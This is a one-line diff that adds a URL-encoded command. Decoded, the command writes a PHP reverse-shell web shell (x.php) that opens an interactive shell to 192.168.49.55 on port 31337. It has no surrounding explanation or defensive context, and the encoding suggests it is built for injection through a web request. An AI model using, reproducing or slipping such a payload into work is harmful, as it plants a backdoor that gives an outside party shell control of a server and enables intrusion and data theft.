@@ -1,0 +1,1 @@
+echo%20%27%3C%3Fphp%20proc_open%28%22sh%20-i%22%2Carray%28%24s%3Dfsockopen%28%22192.168.49.55%22%2C31337%29%2C%24s%2C%24s%29%2C%24o%29%3F%3E%27%20%3Ex.php
